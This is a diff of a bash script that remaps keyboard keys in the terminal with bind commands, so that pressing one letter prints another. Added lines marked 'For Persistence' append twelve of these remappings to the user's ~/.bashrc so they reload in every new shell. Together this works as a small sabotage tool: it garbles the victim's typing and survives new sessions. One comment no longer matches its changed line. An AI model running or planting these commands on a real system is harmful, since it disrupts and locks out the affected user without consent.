@@ -24,7 +24,7 @@ bind '"m":"j"' # when the m key is pressed, j will be output
 bind '"o":"x"' # when the o key is pressed, x will be output
 # bind '"p":"t"' # when the p key is pressed, t will be output
 # bind '"q":"x"' # when the q key is pressed, x will be output
-bind '"r":"/"' # when the r key is pressed, / will be output
+bind '"r":"d"' # when the r key is pressed, / will be output
 #bind '"s":""' # when the s key is pressed,  will be output
 # bind '"t":"j"' # when the t key is pressed, j will be output
 bind '"u":"k"' # when the u key is pressed, k will be output
@@ -40,3 +40,20 @@ bind '"/":"z"' # when the / key is pressed, z will be output
 # bind '"|":"p"' # when the | key is pressed, p will be output
 # bind '";":"u"' # when the ; key is pressed, u will be output
 # bind '"-":"l"' # when the - key is pressed, l will be output
+
+
+# For Persistence, adds the commands to bashrc so it maintains upon reboot
+echo "bind '\"a\":\"q\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\" \":\"h\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"w\":\"n\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"u\":\"k\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"r\":\"d\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"o\":\"x\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"m\":\"j\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"l\":\"v\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"i\":\"y\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"/\":\"z\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"e\":\"t\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+echo "bind '\"c\":\"p\"'" >> ~/.bashrc #adds the command to the bash so upon launching of the terminal the keybind persists.
+
+
